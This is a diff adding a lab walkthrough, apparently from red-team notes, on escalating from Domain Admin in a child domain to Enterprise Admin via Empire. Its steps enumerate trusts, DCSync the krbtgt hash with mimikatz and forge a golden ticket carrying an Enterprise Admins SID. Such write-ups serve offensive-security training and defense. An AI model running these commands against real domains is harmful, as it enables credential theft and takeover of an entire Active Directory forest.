@@ -134,7 +134,56 @@ We now have the agent back, let's just confirm where we landed:
 
 ![](../../.gitbook/assets/empire-childdc-recon.png)
 
+### Checking Trust Relationships
 
+From DC-RED, let's check any domain trust relationships - we see that the `red.offense.local` is a child domain, which is automatically trusting and trusted \(two way trusts\) with/between `offense.local`:
+
+```text
+usemodule situational_awareness/network/powerview/get_domain_trust
+```
+
+![](../../.gitbook/assets/empire-trusts.png)
+
+### From DA to EA
+
+We will now try to escalate from DA in red.offense.local to EA in offense.local. For this, we first need to create a golden ticket for `red.offense.local` and forge it to make us become an EA in offense.local.
+
+First of, getting a SID of a `krbtgt` user account in `red.offense.local`:
+
+```csharp
+(Empire: powershell/situational_awareness/network/powerview/get_domain_trust) > usemodule powershell/management/user_to_sid
+(Empire: powershell/management/user_to_sid) > set Domain offense.local
+(Empire: powershell/management/user_to_sid) > set User krbtgt
+(Empire: powershell/management/user_to_sid) > run
+```
+
+![](../../.gitbook/assets/empire-krbtgt-sid.png)
+
+After that, a password hash of the `krbtgt` accoutn in of the compromised `DC-RED`:
+
+```text
+(Empire: powershell/management/user_to_sid) > usemodule powershell/credentials/mimikatz/dcsync
+(Empire: powershell/credentials/mimikatz/dcsync) > set user red\krbtgt
+(Empire: powershell/credentials/mimikatz/dcsync) > execute
+```
+
+![](../../.gitbook/assets/empire-krbtgt-hash.png)
+
+We can now generate a golden ticket for `offense.local\Domain Admins`: since we have the SID of the `offense.local\krbtgt` and the hash of `red.offense.local\krbtgt`:
+
+```csharp
+usemodule powershell/credentials/mimikatz/golden_ticket
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set user hakhak
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set sids S-1-5-21-4172452648-1021989953-2368502130-519
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set CredID 8
+(Empire: powershell/credentials/mimikatz/golden_ticket) > run
+```
+
+![](../../.gitbook/assets/empire-golden-ticket.png)
+
+The `CredID` property in the dcsync module comes from the Empire's credential store:
+
+![](../../.gitbook/assets/empire-creds.png)
 
 {% embed data="{\"url\":\"https://enigma0x3.net/2016/01/28/an-empire-case-study/\",\"type\":\"link\",\"title\":\"An Empire Case Study\",\"description\":\"This post is part of the ‘Empire Series’, with some background and an ongoing list of series posts \[kept here\].  Empire has gotten a lot of use since its initial release at BSides Las Vegas. Most o…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://enigma0x3.files.wordpress.com/2016/01/lab\_local\_krbtgt.png\",\"width\":1244,\"height\":1160,\"aspectRatio\":0.932475884244373}}" %}
 
